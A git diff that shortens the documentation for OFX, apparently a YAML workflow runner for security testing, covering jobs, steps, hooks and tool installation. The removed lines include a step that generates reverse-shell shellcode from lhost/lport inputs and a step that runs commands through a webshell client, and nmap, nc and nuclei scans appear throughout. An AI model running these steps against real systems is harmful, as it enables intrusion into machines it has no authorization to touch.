@@ -1,402 +1,64 @@
 # Jobs & Steps
 
-Jobs are logical groupings of steps that execute sequentially. Steps are the smallest unit of execution, running individual commands or scripts.
+Jobs group steps; jobs in the same stage run in parallel, steps inside a job run sequentially.
 
-## Jobs
-
-### Basic Job Structure
-
-```yaml
-jobs:
-  job_name:
-    description: Optional job description
-    steps:
-      - name: Step 1
-        run: echo "Hello"
-      
-      - name: Step 2
-        run: echo "World"
-```
-
-### Job Properties
-
-#### name (key)
-The job identifier used for dependencies.
-
-```yaml
-jobs:
-  reconnaissance:  # This is the name
-    steps: [...]
-```
-
-#### description (optional)
-Human-readable job description.
+## Jobs (key fields)
 
 ```yaml
 jobs:
   scan:
-    description: "Performs comprehensive port and service scanning"
-    steps: [...]
+    needs: []           # dependencies; missing = parallel
+    continue_on_error: false
+    envs: { LOG_LEVEL: INFO }
+    steps: [...]        # required
 ```
 
-#### needs (optional)
-List of jobs that must complete before this job runs.
+- `needs`: order jobs; parallel if omitted.
+- `continue_on_error`: keep running later stages if this job fails.
+- `envs`: job-wide env vars.
+
+## Steps (one action each)
+
+Exactly one of `run`, `script`, or `uses`.
 
 ```yaml
-jobs:
-  scan:
-    steps: [...]
-  
-  analyze:
-    needs: [scan]  # Waits for scan job
-    steps: [...]
-  
-  report:
-    needs: [scan, analyze]  # Waits for both
-    steps: [...]
-```
-
-#### continue_on_error (optional)
-Continue workflow execution even if this job fails.
-
-```yaml
-jobs:
-  optional_check:
-    continue_on_error: true
-    steps:
-      - run: some_command_that_might_fail
-```
-
-#### envs (optional)
-Environment variables specific to this job.
-
-```yaml
-jobs:
-  build:
-    envs:
-      CC: gcc
-      CFLAGS: -O2
-    steps:
-      - run: make build
-```
-
-#### hooks (optional)
-Job-specific lifecycle hooks.
-
-```yaml
-jobs:
-  deploy:
-    hooks:
-      on_start:
-        script: echo "Starting deployment"
-        language: shell
-      on_success:
-        script: python notify.py --status success
-        language: shell
-    steps: [...]
-```
-
-## Steps
-
-### Basic Step Structure
-
-```yaml
-steps:
-  - name: Step name
-    run: command to execute
-  
-  - name: Another step
-    script: |
-      #!/bin/bash
-      echo "Multi-line script"
-      echo "Line 2"
-    language: shell
-```
-
-### Step Properties
-
-#### name (required)
-Human-readable step name.
-
-```yaml
-- name: "Scan target for open ports"
-  run: nmap ${{ inputs.target }}
-```
-
-#### run (option 1)
-Single-line command to execute.
-
-```yaml
-- name: List files
-  run: ls -la /tmp
-```
-
-#### script (option 2)
-Multi-line script to execute.
-
-```yaml
-- name: Complex operation
-  script: |
-    #!/bin/bash
-    for port in 80 443 8080; do
-      nc -zv ${{ inputs.target }} $port
-    done
-  language: shell
-```
-
-#### language (required with script)
-Script language: `shell`, `python`, `bash`, `sh`.
-
-```yaml
-- name: Python script
-  script: |
-    import os
-    print(f"Running in {os.getcwd()}")
-  language: python
-```
-
-#### working_dir (optional)
-Working directory for command execution.
-
-```yaml
-- name: Build project
-  run: make build
-  working_dir: /tmp/project
-```
-
-#### envs (optional)
-Environment variables for this step.
-
-```yaml
-- name: Compile with specific flags
-  run: gcc main.c -o app
-  envs:
-    CFLAGS: -O3 -Wall
-    LDFLAGS: -lpthread
-```
-
-#### timeout (optional)
-Maximum execution time in seconds.
-
-```yaml
-- name: Long running scan
-  run: nmap -p- ${{ inputs.target }}
-  timeout: 3600  # 1 hour
-```
-
-#### retry (optional)
-Number of retry attempts on failure.
-
-```yaml
-- name: API call with retry
-  run: curl https://api.example.com
-  retry: 3
-  retry_delay: 5  # seconds between retries
-```
-
-#### continue_on_error (optional)
-Continue to next step even if this step fails.
-
-```yaml
-- name: Optional cleanup
-  run: rm -f /tmp/cache
-  continue_on_error: true
-```
-
-#### hooks (optional)
-Step-specific lifecycle hooks.
-
-```yaml
-- name: Critical operation
-  run: python important.py
+- name: run command
+  run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}
+  timeout: 30       # minutes
+  retry: 1
+  retry_delay: 5
+  continue_on_error: false
+  envs: { MODE: fast }
+  working_directory: ./scans
   hooks:
-    on_start:
-      script: echo "Starting critical step"
-      language: shell
-    on_error:
-      script: python alert_team.py --step failed
-      language: python
-```
+    before_step: { script: echo "starting" }
 
-## Command Execution
-
-### Shell Commands
-
-```yaml
-- name: Basic shell command
-  run: echo "Hello World"
-
-- name: Pipe commands
-  run: cat file.txt | grep "pattern" | wc -l
-
-- name: Command substitution
-  run: echo "Current user is $(whoami)"
-```
-
-### Python Scripts
-
-```yaml
-- name: Inline Python
-  script: |
-    import sys
-    import json
-    
-    data = {"status": "success", "value": 42}
-    print(json.dumps(data))
-  language: python
-
-- name: Python with external script
-  run: python /path/to/script.py --arg value
-```
-
-### Bash Scripts
-
-```yaml
-- name: Bash script with functions
+- name: multi-line script
   script: |
     #!/bin/bash
-    
-    function check_port() {
-      local port=$1
-      nc -zv ${{ inputs.target }} $port
-    }
-    
-    check_port 80
-    check_port 443
-  language: bash
+    echo "$TARGET"
+  envs: { TARGET: ${{ inputs.target }} }
 ```
 
-## Using OFX APIs in Steps
-
-### Python API Example
+## Nested workflow
 
 ```yaml
-- name: Port scanning with OFX API
-  script: |
-    from ofx.api import PortScanner
-    
-    scanner = PortScanner(
-        target='${{ inputs.target }}',
-        ports='1-1000'
-    )
-    
-    results = scanner.scan()
-    print(f"Open ports: {results}")
-  language: python
+- name: reuse workflow
+  uses: ./subflow.yml
+  run_with: { target: ${{ inputs.target }} }
+  secrets: inherit
 ```
 
-### Shellcode Generation
+## Outputs
 
-```yaml
-- name: Generate shellcode
-  script: |
-    from ofx.api import shellcode
-    
-    code = shellcode.generate(
-        platform='linux',
-        arch='x64',
-        payload='reverse_shell',
-        lhost='${{ inputs.lhost }}',
-        lport='${{ inputs.lport }}'
-    )
-    
-    with open('payload.bin', 'wb') as f:
-      f.write(code)
-  language: python
-```
+Use `${{ ctx.output_path }}` for files; set structured outputs from steps with `OFX_OUTPUTS` in your command or script.
 
-### Web Shell Client
+## Handy template helpers
 
-```yaml
-- name: Execute command via webshell
-  script: |
-    from ofx.api.webshell import WebShellClient
-    
-    client = WebShellClient(
-        url='${{ inputs.webshell_url }}',
-        password='${{ secrets.SHELL_PASSWORD }}'
-    )
-    
-    result = client.execute('whoami')
-    print(result)
-  language: python
-```
+- `${{ tools_bin_dir }}` for installed tool binaries.
+- `${{ uv_install('pkg1 pkg2') }}` / `${{ go_install('module@latest') }}` for quick installs.
 
-## Tool Installation
-
-OFX provides helper functions for installing tools:
-
-### UV Package Manager
-
-```yaml
-- name: Install Python packages
-  run: ${{ uv_install('requests beautifulsoup4') }}
-
-- name: Use installed package
-  script: |
-    import requests
-    response = requests.get('https://example.com')
-    print(response.status_code)
-  language: python
-```
-
-### Go Tools
-
-```yaml
-- name: Install Go tool
-  run: ${{ go_install('github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest') }}
-
-- name: Run nuclei
-  run: ${{ tools_bin_dir }}/nuclei -target ${{ inputs.target }}
-```
-
-### Pip Packages
-
-```yaml
-- name: Install with pip
-  run: ${{ pip_install('scapy') }}
-```
-
-### Cargo (Rust)
-
-```yaml
-- name: Install Rust tool
-  run: ${{ cargo_install('ripgrep') }}
-```
-
-## File Operations
-
-### Reading Files
-
-```yaml
-- name: Process configuration
-  script: |
-    import yaml
-    
-    with open('${{ ctx.output_path }}/config.yml') as f:
-      config = yaml.safe_load(f)
-    
-    print(f"Target: {config['target']}")
-  language: python
-```
-
-### Writing Files
-
-```yaml
-- name: Generate report
-  script: |
-    with open('${{ ctx.output_path }}/report.txt', 'w') as f:
-      f.write(f"Scan completed for {ctx.inputs['target']}\n")
-      f.write(f"Results saved to {ctx.output_path}\n")
-  language: python
-```
-
-### File Manipulation
-
-```yaml
-- name: Organize results
-  run: |
-    mkdir -p ${{ ctx.output_path }}/scans
+See also: [templates](templates.md) for `${{ }}` rendering and [hooks](hooks.md) for step lifecycle triggers.
     mv *.xml ${{ ctx.output_path }}/scans/
     tar -czf ${{ ctx.output_path }}/results.tar.gz ${{ ctx.output_path }}/scans
 ```
